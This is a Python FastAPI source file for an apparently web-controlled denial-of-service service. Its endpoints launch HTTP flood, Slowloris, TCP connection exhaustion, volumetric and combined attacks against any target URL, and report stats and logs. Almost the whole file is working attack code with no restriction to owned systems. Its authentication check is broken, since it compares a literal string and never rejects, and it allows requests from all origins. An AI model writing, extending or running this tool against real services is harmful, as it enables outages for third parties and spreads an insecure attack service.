import os
import time
import logging
import multiprocessing
import socket
import random
import requests
import threading
from fastapi import FastAPI, HTTPException, Header, Depends
from pydantic import BaseModel, validator
from typing import Optional, Dict, Any
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
import json

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Security (authentication left as original)
security = HTTPBearer()

# FastAPI app
app = FastAPI()

# Allow CORS for Next.js or any other frontend framework
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Create a Manager for shared state among processes
manager = multiprocessing.Manager()
attack_processes = {}  # Still maintained as a normal dict for process objects
attack_stats = manager.dict()    # Shared dictionary for stats
attack_logs = manager.dict()     # Shared dictionary for logs

# Models
class AttackConfig(BaseModel):
    target_url: str
    duration: int  # in seconds
    intensity: int  # 1-5 scale
    concurrent_connections: int
    attack_type: str  # http_flood, slowloris, tcp_exhaustion, volumetric, mixed

    @validator('intensity')
    def intensity_range(cls, v):
        if not 1 <= v <= 5:
            raise ValueError('intensity must be between 1 and 5')
        return v

    @validator('duration')
    def duration_positive(cls, v):
        if v <= 0:
            raise ValueError('duration must be positive')
        return v

# A helper model for attack stats (converted to dict for shared usage)
class AttackStats(BaseModel):
    requests_sent: int = 0
    connections_open: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: datetime = None
    complete: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "requests_sent": self.requests_sent,
            "connections_open": self.connections_open,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "complete": self.complete
        }

# Helper function to extract host and port from URL
def extract_host(target_url: str, default_port: int = 80) -> (str, int):
    try:
        # Remove scheme and get host
        url_without_scheme = target_url.split("://")[-1]
        host = url_without_scheme.split("/")[0]
        return host, default_port
    except Exception as e:
        logger.error(f"Error extracting host: {e}")
        raise

# Authentication dependency (kept as is)
def authenticate(credentials: HTTPAuthorizationCredentials = Depends(security)) -> bool:
    token = "os.getenv(API_SECRET_KEY)"
    if token == os.getenv("API_SECRET_KEY"):
        return True
    return False

# Health check endpoint
@app.get("/health")
async def health_check():
    return {"status": "ok", "message": "Service is running"}

# Sophisticated HTTP Flood Attack:
def http_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    shared_stats["requests_sent"] = 0
    shared_stats["errors"] = 0
    user_agents = [
        "DDoS-Test", "Mozilla/5.0", "SaaS-Security-Tool", "Indie-Hacker-Agent"
    ]
    # The sleep factor reduces gap between requests based on intensity (higher intensity -> less sleep)
    sleep_factor = max(0.05, 1 / intensity)
    while time.time() - start_time < duration:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(target_url, headers=headers, timeout=5)
            # Optionally, log every 100 requests
            shared_stats["requests_sent"] += 1
            if shared_stats["requests_sent"] % 100 == 0:
                shared_logs.setdefault("http_flood", []).append(
                    f"{datetime.now().isoformat()}: Sent {shared_stats['requests_sent']} requests."
                )
            time.sleep(sleep_factor)
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("http_flood", []).append(
                f"{datetime.now().isoformat()}: HTTP Flood Error: {e}"
            )
    return

# Sophisticated Slowloris Attack:
def slowloris(target_url: str, duration: int, intensity: int, concurrent_connections: int,
              shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    sockets = []
    shared_stats["connections_open"] = 0
    shared_stats["errors"] = 0
    host, port = extract_host(target_url)
    for _ in range(concurrent_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Slowloris\r\n".encode())
            sockets.append(s)
            shared_stats["connections_open"] += 1
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Slowloris socket init error: {e}"
            )
    # Varying sleep interval based on intensity
    sleep_interval = max(0.5, 2 / intensity)
    while time.time() - start_time < duration:
        try:
            # Periodically send a header to keep the connection alive.
            for s in sockets:
                try:
                    s.send("X-a: b\r\n".encode())
                except Exception as err:
                    shared_stats["errors"] += 1
                    shared_logs.setdefault("slowloris", []).append(
                        f"{datetime.now().isoformat()}: Slowloris keep-alive error: {err}"
                    )
            time.sleep(sleep_interval)
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Slowloris loop error: {e}"
            )
    for s in sockets:
        try:
            s.close()
        except Exception as e:
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Error closing socket: {e}"
            )
    return

# Sophisticated TCP Exhaustion Attack:
def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                   shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    sockets = []
    shared_stats["connections_open"] = 0
    shared_stats["errors"] = 0
    host, port = extract_host(target_url)
    for _ in range(concurrent_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sockets.append(s)
            shared_stats["connections_open"] += 1
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("tcp_exhaustion", []).append(
                f"{datetime.now().isoformat()}: TCP Exhaustion init error: {e}"
            )
    # Keep the connections alive, periodically check every 1 second
    while time.time() - start_time < duration:
        time.sleep(1)
    for s in sockets:
        try:
            s.close()
        except Exception as e:
            shared_logs.setdefault("tcp_exhaustion", []).append(
                f"{datetime.now().isoformat()}: Error closing TCP socket: {e}"
            )
    return

# Sophisticated Volumetric Attack:
def volumetric(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    shared_stats["bytes_sent"] = 0
    shared_stats["errors"] = 0
    host, port = extract_host(target_url)
    # Payload size may vary with intensity: base 1MB multiplied by intensity factor
    payload_size = 1024 * 1024 * intensity
    payload = b"0" * payload_size
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sent = s.send(payload)
            shared_stats["bytes_sent"] += sent
            s.close()
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("volumetric", []).append(
                f"{datetime.now().isoformat()}: Volumetric error: {e}"
            )
    return

# Sophisticated Mixed Attack: run sub-attacks concurrently
def mixed(target_url: str, duration: int, intensity: int, concurrent_connections: int,
          shared_stats: Dict, shared_logs: Dict):
    # Prepare separate shared dicts for each sub-attack
    sub_stats = manager.dict({
        "http_flood": manager.dict({"requests_sent": 0, "errors": 0}),
        "slowloris": manager.dict({"connections_open": 0, "errors": 0}),
        "tcp_exhaustion": manager.dict({"connections_open": 0, "errors": 0}),
        "volumetric": manager.dict({"bytes_sent": 0, "errors": 0})
    })
    threads = []

    # Launch each attack in its own thread
    t1 = threading.Thread(target=http_flood, args=(target_url, duration, intensity, concurrent_connections, sub_stats["http_flood"], shared_logs.setdefault("http_flood", [])))
    t2 = threading.Thread(target=slowloris, args=(target_url, duration, intensity, concurrent_connections, sub_stats["slowloris"], shared_logs.setdefault("slowloris", [])))
    t3 = threading.Thread(target=tcp_exhaustion, args=(target_url, duration, intensity, concurrent_connections, sub_stats["tcp_exhaustion"], shared_logs.setdefault("tcp_exhaustion", [])))
    t4 = threading.Thread(target=volumetric, args=(target_url, duration, intensity, concurrent_connections, sub_stats["volumetric"], shared_logs.setdefault("volumetric", [])))
    
    threads.extend([t1, t2, t3, t4])
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Combine sub-attack stats into one summary
    combined = {
        "http_flood": dict(sub_stats["http_flood"]),
        "slowloris": dict(sub_stats["slowloris"]),
        "tcp_exhaustion": dict(sub_stats["tcp_exhaustion"]),
        "volumetric": dict(sub_stats["volumetric"])
    }
    shared_stats.update(combined)
    return

# Attack dispatcher - now accepts additional shared dicts for stats and logs
def execute_attack(config: AttackConfig, shared_stats: Dict, shared_logs: Dict):
    # Mark the start time in the shared stats dict
    shared_stats["start_time"] = datetime.now().isoformat()
    # Preselect the attack based on configuration
    attack_func = {
        "http_flood": http_flood,
        "slowloris": slowloris,
        "tcp_exhaustion": tcp_exhaustion,
        "volumetric": volumetric,
        "mixed": mixed,
    }.get(config.attack_type, http_flood)
    try:
        attack_func(config.target_url, config.duration, config.intensity, config.concurrent_connections, shared_stats, shared_logs)
    except Exception as e:
        shared_logs.setdefault("general", []).append(
            f"{datetime.now().isoformat()}: General execution error: {e}"
        )
    shared_stats["complete"] = True

# API Endpoints
@app.post("/api/attack/start", dependencies=[Depends(authenticate)])
async def start_attack(config: AttackConfig):
    attack_id = str(len(attack_processes) + 1)
    # Initialize shared stats and logs for this attack
    attack_stats[attack_id] = manager.dict(AttackStats(start_time=datetime.now(), complete=False).to_dict())
    attack_logs[attack_id] = manager.list()
    
    # Launch the attack in a separate process, passing the shared dicts
    process = multiprocessing.Process(target=execute_attack, args=(config, attack_stats[attack_id], attack_logs[attack_id]))
    process.start()
    attack_processes[attack_id] = process
    logger.info(f"Started attack {attack_id} with config {config}")
    return {"attack_id": attack_id}

@app.get("/api/attack/{attack_id}/stop", dependencies=[Depends(authenticate)])
async def stop_attack(attack_id: str):
    if attack_id in attack_processes:
        attack_processes[attack_id].terminate()
        del attack_processes[attack_id]
        logger.info(f"Stopped attack {attack_id}")
        # Mark as complete in shared stats
        if attack_id in attack_stats:
            stats = attack_stats[attack_id]
            stats["complete"] = True
        return {"status": "stopped"}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/logs", dependencies=[Depends(authenticate)])
async def get_logs(attack_id: str):
    if attack_id in attack_logs:
        # Convert manager.list() to normal list
        return {"logs": list(attack_logs[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats", dependencies=[Depends(authenticate)])
async def get_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": dict(attack_stats[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats/realtime", dependencies=[Depends(authenticate)])
async def get_realtime_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": dict(attack_stats[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

# To run the app
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
